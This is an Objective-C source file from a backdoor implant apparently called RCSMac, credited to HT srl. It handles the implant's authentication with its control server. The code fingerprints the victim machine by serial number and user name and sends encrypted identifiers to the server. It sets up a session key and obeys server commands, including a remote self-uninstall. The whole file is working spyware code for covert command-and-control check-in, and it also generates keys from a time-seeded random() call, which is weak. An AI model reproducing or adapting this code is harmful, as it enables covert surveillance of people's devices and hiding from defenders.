/*
 * RCSMac - Authentication Network Operation
 *
 *
 * Created by revenge on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "AuthNetworkOperation.h"

#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"

#define JSON_CONF
////#import "RCSMLogger.h"
////#import "RCSMDebug.h"

//#define DEBUG_AUTH_NOP
#define infoLog NSLog
#define errorLog NSLog
#define warnLog NSLog

@implementation AuthNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if ((self = [super init]))
    {
#ifdef JSON_CONF
    mBackdoorSignature = [[NSData alloc] initWithBytes: gBackdoorSignature
                                                length: CC_MD5_DIGEST_LENGTH];
#else
    // Temp Code
    unsigned char signature[CC_MD5_DIGEST_LENGTH];
    CC_MD5(gBackdoorSignature, strlen(gBackdoorSignature), signature);
    
    // per 7.6 si usa l'hash??
    mBackdoorSignature = [[NSData alloc] initWithBytes: &signature
                                                length: CC_MD5_DIGEST_LENGTH];
#endif

      mTransport = aTransport;
      
#ifdef DEBUG_AUTH_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mBackdoorSignature release];
  //[mTransport release];
  
  [super dealloc];
}

- (BOOL)perform
{ 
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  u_int randomNumber, i;
  srandom(time(NULL));

  char nullTerminator = 0x00;
  
  NSMutableData *kd     = [[NSMutableData alloc] init];
  NSMutableData *nOnce  = [[NSMutableData alloc] init];
  
  //
  // Generate kd (16 bytes)
  //
  for (i = 0; i < 16; i += 4)
    {
      randomNumber = random();
      [kd appendBytes: (const void *)&randomNumber
               length: sizeof(randomNumber)];
    }
  //
  // Generate nonce (16 bytes)
  //
  for (i = 0; i < 16; i += 4)
    {
      randomNumber = random();
      [nOnce appendBytes: (const void *)&randomNumber
                  length: sizeof(randomNumber)];
    }
  
#ifdef DEV_MODE
  unsigned char confkey[CC_MD5_DIGEST_LENGTH];
  unsigned char instance[CC_SHA1_DIGEST_LENGTH];
  CC_MD5(gConfAesKey, strlen(gConfAesKey), confkey);
  CC_SHA1(gInstanceId, strlen(gInstanceId), instance);
  
  NSData *confKey = [NSData dataWithBytes: &confkey
                                   length: CC_MD5_DIGEST_LENGTH];
  NSData *instanceID = [NSData dataWithBytes: &instance
                                      length: CC_SHA1_DIGEST_LENGTH];
#else
  NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
  
  NSString *serialNumber = getSystemSerialNumber();
  
  NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
   
  NSString *userName = NSUserName();
  [_instanceID appendString: userName];
  
  NSData *instanceID = [_instanceID sha1Hash];
  [_instanceID release];
#endif
  
  NSMutableData *backdoorID = [[NSMutableData alloc] init];
  
  [backdoorID appendBytes: &gBackdoorID
                   length: strlen(gBackdoorID)];
                   
  char *_backdoorIDbuff = (char*)[backdoorID bytes];
#ifdef JSON_CONF
  _backdoorIDbuff[strlen(gBackdoorID)-1] = _backdoorIDbuff[strlen(gBackdoorID)-2] = 0;  
#else
  // per 7.6 funziona in append????
  [backdoorID appendBytes: &nullTerminator
                   length: sizeof(char)];
  [backdoorID appendBytes: &nullTerminator
                   length: sizeof(char)];
#endif

  NSMutableData *type = [[NSMutableData alloc] initWithData:
                         [@"IPHONE" dataUsingEncoding: NSASCIIStringEncoding]];
                         
  for (i = 0; i < 10; i++)
    {
      [type appendBytes: &nullTerminator
                 length: sizeof(char)];
    }
  
  //
  // Generate id token sha1(backdoor_id + instance + subtype + confkey)
  //
  NSMutableData *idToken = [[NSMutableData alloc] init];
  [idToken appendData: backdoorID];
  [idToken appendData: instanceID];
  [idToken appendData: type];
  [idToken appendData: confKey];

#ifdef DEBUG_AUTH_NOP
  infoLog(@"kd    : %@", kd);
  infoLog(@"nOnce : %@", nOnce);
  infoLog(@"backdoorID  : %@", backdoorID);
  infoLog(@"instanceID  : %@", instanceID);
  infoLog(@"type        : %@", type);
  infoLog(@"confkey     : %@", confKey);
  infoLog(@"idToken: %@", idToken);
#endif

  NSData *shaIDToken = [idToken sha1Hash];
  
#ifdef DEBUG_AUTH_NOP
  infoLog(@"shaIDToken: %@", shaIDToken);
#endif
  
  // Prepare the encrypted message
  NSMutableData *message = [[NSMutableData alloc] init];
  [message appendData: kd];
  [message appendData: nOnce];
  [message appendData: backdoorID];
  [message appendData: instanceID];
  [message appendData: type];
  [message appendData: shaIDToken];
  
#ifdef DEBUG_AUTH_NOP
  infoLog(@"message: %@", message);
#endif
  
  NSMutableData *encMessage = [[NSMutableData alloc] initWithData: message];
  [encMessage encryptWithKey: mBackdoorSignature];
  //NSMutableData *tmpencMessage = [[NSMutableData alloc] initWithData: message];
  //NSMutableData *encMessage = [tmpencMessage encryptPKCS7: mBackdoorSignature];
  
#ifdef DEBUG_AUTH_NOP
  infoLog(@"message enc: %@", encMessage);
#endif
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse  = nil;
  NSData *replyData           = nil;
  
  replyData = [mTransport sendData: encMessage
                 returningResponse: urlResponse];
  
  if ([replyData length] != 64)
    {
#ifdef DEBUG_AUTH_NOP
      errorLog(@"Wrong auth response length");
      errorLog(@"replyData: %@", replyData);
#endif
      
      [kd release];
      [nOnce release];
      [backdoorID release];
      [type release];
      [idToken release];
      [message release];
      [encMessage release];
      [outerPool release];
      
      return NO;
    }
  
  // first 32 bytes are the Ks choosen by the server
  // decrypt it and store to create the session key along with Kd and Cb
  NSMutableData *ksCrypted = [[NSMutableData alloc] initWithBytes: [replyData bytes]
                                                           length: 32];
  [ksCrypted decryptWithKey: mBackdoorSignature];
  NSData *ks = [[NSData alloc] initWithBytes: [ksCrypted bytes]
                                      length: CC_MD5_DIGEST_LENGTH];
  [ksCrypted release];
  
  NSString *ksString = [[NSString alloc] initWithData: ks
                                             encoding: NSUTF8StringEncoding];
  
#ifdef DEBUG_AUTH_NOP
  infoLog(@"ks: %@", ks);
#endif
  
  // calculate the session key -> K = sha1(Cb || Ks || Kd)
  // we use a schema like PBKDF1
  // remember it for the entire session
  NSMutableData *sessionKey = [[NSMutableData alloc] init];
  [sessionKey appendData: confKey];
  [sessionKey appendData: ks];
  [sessionKey appendData: kd];
  
  gSessionKey = [[NSMutableData alloc] initWithData: [sessionKey sha1Hash]];
  
#ifdef DEBUG_AUTH_NOP
  infoLog(@"shaSessionKey: %@", gSessionKey);
#endif
  
  // second part of the server response contains the NOnce and the response
  // extract the NOnce and check if it is ok
  // this MUST be the same NOnce sent to the server, but since it is crypted
  // with the session key we know that the server knows Cb and thus is trusted
  NSMutableData *secondPartResponse;
  @try
    {
      secondPartResponse = [[NSMutableData alloc] initWithData:
                            [replyData subdataWithRange:
                             NSMakeRange(32, [replyData length] - 32)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_AUTH_NOP
      errorLog(@"exception on secondPartResponse makerange (%@)", [e reason]);
#endif
      
      return NO;
    }
  
  [secondPartResponse decryptWithKey: gSessionKey];
  
  NSData *rNonce = [[NSData alloc] initWithBytes: [secondPartResponse bytes]
                                          length: 16];
  if ([nOnce isEqualToData: rNonce] == NO)
    {
#ifdef DEBUG_AUTH_NOP
      errorLog(@"Invalid NOnce");
#endif
      
      return NO;
    }
  
  NSData *_protoCommand;
  uint32_t protoCommand;
  
  @try
    {
      _protoCommand = [[NSData alloc] initWithData:
                       [secondPartResponse subdataWithRange: NSMakeRange(16, 4)]];
      [_protoCommand getBytes: &protoCommand
                        range: NSMakeRange(0, sizeof(int))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_AUTH_NOP
      errorLog(@"exception on protoCommand makerange (%@)", [e reason]);
#endif
      
      return NO;
    }
  
  [kd release];
  [nOnce release];
  [idToken release];
  [message release];
  [encMessage release];
  [ks release];
  [ksString release];
  [sessionKey release];
  [secondPartResponse release];
  [rNonce release];
  
  [outerPool release];
  
  switch (protoCommand)
    {
    case PROTO_OK:
      {
#ifdef DEBUG_AUTH_NOP
        infoLog(@"Auth Response OK");
#endif
      } break;
    case PROTO_UNINSTALL:
      {
#ifdef DEBUG_AUTH_NOP
        infoLog(@"Uninstall");
#endif
      
        RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
        [taskManager uninstallMeh];
      } break;
    case PROTO_NO:
    default:
      {
#ifdef DEBUG_AUTH_NOP
        errorLog(@"Received command: %d", protoCommand);
#endif

        [_protoCommand release];
        return NO;
      } break;
    }

  [_protoCommand release];
  return YES;
}

@end